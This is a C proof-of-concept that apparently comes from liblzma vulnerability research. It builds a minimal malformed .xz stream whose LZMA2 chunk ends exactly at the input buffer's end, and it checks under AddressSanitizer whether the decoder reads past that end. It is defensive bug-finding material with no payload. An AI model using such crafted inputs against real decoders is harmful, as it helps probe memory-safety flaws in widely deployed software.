// PoC for the LZMA2 decoder chunk-boundary handling.
//
// This builds a minimal .xz Stream whose only LZMA2 chunk declares a
// compressed size of five bytes, and the input buffer ends exactly when
// those five bytes end. The chunk data alone is not enough to finish the
// chunk (it only initializes the range decoder), so the decoder has to
// report an error without touching memory past the caller's input buffer.
//
// Build against an ASan-instrumented liblzma:
//   cc -fsanitize=address -g -I src/liblzma/api \
//       pocs/newbug.c build/liblzma.a -o /tmp/newbug_poc

#include <lzma.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


static void
put32le(uint8_t *p, uint32_t v)
{
	p[0] = (uint8_t)(v);
	p[1] = (uint8_t)(v >> 8);
	p[2] = (uint8_t)(v >> 16);
	p[3] = (uint8_t)(v >> 24);
}


int
main(void)
{
	uint8_t buf[35];
	size_t pos = 0;

	// Stream Header: magic bytes, CRC32 Check type, CRC32 of the flags.
	static const uint8_t magic[6] = {
		0xFD, '7', 'z', 'X', 'Z', 0x00,
	};
	memcpy(buf + pos, magic, sizeof(magic));
	pos += sizeof(magic);

	buf[pos++] = 0x00;
	buf[pos++] = 0x01; // Stream Flags: Check = CRC32
	put32le(buf + pos, lzma_crc32(buf + 6, 2, 0));
	pos += 4;

	// Block Header: 12 bytes, one filter (LZMA2), no size fields.
	buf[pos++] = 0x02; // Header Size: (12 / 4) - 1
	buf[pos++] = 0x00; // Block Flags: one filter, no sizes present
	buf[pos++] = 0x21; // Filter ID: LZMA2
	buf[pos++] = 0x01; // Size of Properties
	buf[pos++] = 0x00; // Properties: dictionary size is 4096
	buf[pos++] = 0x00; // Header Padding
	buf[pos++] = 0x00; // Header Padding
	buf[pos++] = 0x00; // Header Padding
	put32le(buf + pos, lzma_crc32(buf + 12, 8, 0));
	pos += 4;

	// LZMA2 chunk header. Control 0xE0 means an LZMA chunk with
	// dictionary reset, state reset, and new properties.
	buf[pos++] = 0xE0;
	buf[pos++] = 0x00; // Uncompressed Size high byte ((1 - 1) >> 8)
	buf[pos++] = 0x00; // Uncompressed Size low byte
	buf[pos++] = 0x00; // Compressed Size high byte ((5 - 1) >> 8)
	buf[pos++] = 0x04; // Compressed Size low byte
	buf[pos++] = 0x00; // LZMA properties: lc = lp = pb = 0

	// The five bytes of chunk data that the header claims. The first
	// byte must be 0x00 for the range decoder initialization.
	memset(buf + pos, 0x00, 5);
	pos += 5;

	// Decode from an exact-sized heap buffer so that a read past the
	// end of the input is caught by AddressSanitizer.
	uint8_t *input = malloc(pos);
	if (input == NULL)
		return 1;

	memcpy(input, buf, pos);

	lzma_stream strm = LZMA_STREAM_INIT;
	lzma_ret ret = lzma_stream_decoder(&strm, UINT64_MAX, 0);
	if (ret != LZMA_OK) {
		fprintf(stderr, "lzma_stream_decoder() failed: %d\n",
				(int)ret);
		free(input);
		return 1;
	}

	strm.next_in = input;
	strm.avail_in = pos;

	uint8_t out[4096];
	strm.next_out = out;
	strm.avail_out = sizeof(out);

	ret = lzma_code(&strm, LZMA_RUN);
	printf("lzma_code() returned %d, consumed %zu byte(s)\n",
			(int)ret, pos - strm.avail_in);

	lzma_end(&strm);
	free(input);
	return 0;
}
